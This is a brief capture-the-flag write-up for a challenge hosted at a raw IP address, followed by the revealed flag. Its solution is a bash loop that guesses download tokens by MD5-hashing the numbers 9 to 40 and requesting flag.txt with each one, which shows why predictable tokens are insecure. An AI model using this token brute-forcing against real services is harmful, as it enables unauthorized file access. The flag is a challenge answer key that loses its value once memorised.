#### Challenge:

http://159.89.22.33:25632

---

#### Solution:

```bash
for i in `seq 9 40`; do
    echo -n "$i - ";
    curl "http://159.89.22.33:25632/download.php?file=flag.txt&token=$(echo -n $i | md5sum | awk '{print $1}')";
    echo;
done
```

---

<details><summary>FLAG:</summary>

```
AFFCTF{Pr3dic71bl3_t0k3n5_4r3_b4d}
```

</details>
